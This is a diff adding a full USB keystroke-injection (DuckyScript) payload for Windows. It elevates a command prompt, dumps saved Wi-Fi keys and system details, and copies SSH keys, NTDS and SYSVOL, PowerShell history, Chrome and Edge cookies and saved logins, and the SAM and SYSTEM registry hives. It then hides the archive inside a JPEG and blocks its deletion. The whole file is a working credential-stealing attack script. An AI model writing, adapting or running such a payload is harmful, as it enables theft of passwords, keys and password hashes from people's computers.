@@ -1,0 +1,209 @@
+DELAY 5000
+
+GUI r
+DELAY 1000
+STRING powershell -Command "Start-Process cmd -Verb RunAs"
+ENTER
+DELAY 3000
+LEFTARROW
+DELAY 1000
+ENTER
+DELAY 3000
+
+STRING prompt $E[0;32m$P$E[0m $E[0;37m$D$E[0m $E[0;31m$T$E[0m$G
+ENTER
+DELAY 100
+STRING title Hacking in Progress...
+ENTER
+DELAY 100
+
+STRING mkdir "%USERPROFILE%\Desktop\GodMode.{ED7BA470-8E54-465E-825C-99712043E01C}"
+ENTER
+DELAY 100
+STRING mkdir "%USERPROFILE%\Desktop\WinVault.{1206F5F1-0569-412C-8FEC-3204630DFB70}"
+ENTER
+DELAY 100
+
+STRING powershell -Command "& {Add-Type -AssemblyName System.Drawing; $b = New-Object System.Drawing.Bitmap(666,666); $g = [System.Drawing.Graphics]::FromImage($b); $g.Clear([System.Drawing.Color]::Black); $b.Save([System.IO.Path]::Combine($env:USERPROFILE, 'Desktop', 'black.jpg'), [System.Drawing.Imaging.ImageFormat]::Jpeg);}"
+ENTER
+DELAY 2000
+
+STRING echo =============== Show all wifi passwords =============== >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 100
+STRING for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @if "%j" NEQ "" (echo SSID: %j & netsh wlan show profiles %j key=clear | findstr "Key Content") >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 3000
+
+STRING echo =============== Display detailed system info =============== >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 100
+STRING systeminfo >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 5000
+
+STRING echo =============== Network interfaces info =============== >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 100
+STRING ipconfig /all >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 500
+
+STRING echo =============== Get MAC addresses =============== >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 100
+STRING getmac -v >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 1500
+
+STRING echo =============== Routing table =============== >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 100
+STRING route print >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 500
+
+STRING echo =============== DNS info =============== >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 100
+STRING ipconfig /displaydns >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 500
+
+STRING echo =============== Netstat info =============== >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 100
+STRING netstat -ano >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 500
+
+STRING echo =============== BitLocker info =============== >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 100
+STRING manage-bde -status >> "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 8000
+
+STRING xcopy "%USERPROFILE%\.ssh" "%USERPROFILE%\Desktop\info\.ssh" /E /I /H /Y
+ENTER
+DELAY 1000
+STRING xcopy "C:\Windows\Temp" "%USERPROFILE%\Desktop\info\Temp" /E /I /H /Y
+ENTER
+DELAY 1000
+STRING xcopy "C:\Windows\System32\winevt\Logs" "%USERPROFILE%\Desktop\info\Logs" /E /I /H /Y
+ENTER
+DELAY 3000
+STRING xcopy "C:\Windows\Security" "%USERPROFILE%\Desktop\info\Security" /E /I /H /Y
+ENTER
+DELAY 1000
+STRING xcopy "C:\Windows\Logs" "%USERPROFILE%\Desktop\info\Logs_2" /E /I /H /Y
+ENTER
+DELAY 3000
+STRING xcopy "C:\Windows\System32\drivers\etc" "%USERPROFILE%\Desktop\info\etc" /E /I /H /Y
+ENTER
+DELAY 1000
+STRING xcopy "C:\Windows\NTDS" "%USERPROFILE%\Desktop\info\NTDS" /E /I /H /Y
+ENTER
+DELAY 1000
+STRING xcopy "C:\Windows\SYSVOL" "%USERPROFILE%\Desktop\info\SYSVOL" /E /I /H /Y
+ENTER
+DELAY 1000
+STRING xcopy "%USERPROFILE%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine" "%USERPROFILE%\Desktop\info\PSReadLine" /E /I /H /Y
+ENTER
+DELAY 500
+
+STRING mkdir %USERPROFILE%\Desktop\info\Chrome
+ENTER
+DELAY 100
+STRING xcopy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cookies" "%USERPROFILE%\Desktop\info\Chrome\Cookies" /E /I /H /Y
+ENTER
+DELAY 2000
+STRING copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\History" "%USERPROFILE%\Desktop\info\Chrome\History"
+ENTER
+DELAY 500
+STRING xcopy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Cache" "%USERPROFILE%\Desktop\info\Chrome\Cache" /E /I /H /Y
+ENTER
+DELAY 5000
+STRING copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Login Data" "%USERPROFILE%\Desktop\info\Chrome\Login Data"
+ENTER
+DELAY 500
+STRING copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Bookmarks" "%USERPROFILE%\Desktop\info\Chrome\Bookmarks"
+ENTER
+DELAY 500
+STRING xcopy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\Local Storage" "%USERPROFILE%\Desktop\info\Chrome\Local Storage" /E /I /H /Y
+ENTER
+DELAY 1000
+STRING copy "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Local State" "%USERPROFILE%\Desktop\info\Chrome\Local State"
+ENTER
+DELAY 500
+
+STRING mkdir %USERPROFILE%\Desktop\info\Edge
+ENTER
+DELAY 100
+STRING xcopy "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\Cookies" "%USERPROFILE%\Desktop\info\Edge\Cookies" /E /I /H /Y
+ENTER
+DELAY 2000
+STRING copy "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\History" "%USERPROFILE%\Desktop\info\Edge\History"
+ENTER
+DELAY 500
+STRING xcopy "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\Cache" "%USERPROFILE%\Desktop\info\Edge\Cache" /E /I /H /Y
+ENTER
+DELAY 5000
+STRING copy "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\Login Data" "%USERPROFILE%\Desktop\info\Edge\Login Data"
+ENTER
+DELAY 500
+STRING copy "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\Bookmarks" "%USERPROFILE%\Desktop\info\Edge\Bookmarks"
+ENTER
+DELAY 500
+STRING xcopy "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Default\Local Storage" "%USERPROFILE%\Desktop\info\Edge\Local Storage" /E /I /H /Y
+ENTER
+DELAY 1000
+STRING copy "%USERPROFILE%\AppData\Local\Microsoft\Edge\User Data\Local State" "%USERPROFILE%\Desktop\info\Edge\Local State"
+ENTER
+DELAY 500
+
+STRING mkdir %USERPROFILE%\Desktop\info\registry
+ENTER
+DELAY 100
+STRING reg save HKLM\SAM %USERPROFILE%\Desktop\info\registry\SAM.save /y
+ENTER
+DELAY 500
+STRING reg export HKLM\SAM %USERPROFILE%\Desktop\info\registry\SAM.reg /y
+ENTER
+DELAY 500
+STRING reg save HKLM\SYSTEM %USERPROFILE%\Desktop\info\registry\SYSTEM.save /y
+ENTER
+DELAY 500
+STRING reg export HKLM\SYSTEM %USERPROFILE%\Desktop\info\registry\SYSTEM.reg /y
+ENTER
+DELAY 500
+
+STRING tar -czf "%USERPROFILE%\Desktop\info_%DATE:~6,4%-%DATE:~3,2%-%DATE:~0,2%.tar.gz" -C "%USERPROFILE%\Desktop" info info.txt
+ENTER
+DELAY 10000
+STRING rd /s /q "%USERPROFILE%\Desktop\info"
+ENTER
+DELAY 1000
+STRING del "%USERPROFILE%\Desktop\info.txt"
+ENTER
+DELAY 500
+
+STRING copy /b "%USERPROFILE%\Desktop\black.jpg" + "%USERPROFILE%\Desktop\info_%DATE:~6,4%-%DATE:~3,2%-%DATE:~0,2%.tar.gz" "%USERPROFILE%\Desktop\blackT.jpg"
+ENTER
+DELAY 2000
+STRING del "%USERPROFILE%\Desktop\black.jpg"
+ENTER
+DELAY 500
+STRING del "%USERPROFILE%\Desktop\info_%DATE:~6,4%-%DATE:~3,2%-%DATE:~0,2%.tar.gz"
+ENTER
+DELAY 2000
+
+STRING icacls "%USERPROFILE%\Desktop\blackT.jpg" /deny Wszyscy:(D)
+ENTER
+DELAY 500
+STRING icacls "%USERPROFILE%\Desktop\blackT.jpg" /deny Everyone:(D)
+ENTER
+DELAY 500
+
+STRING exit
+ENTER
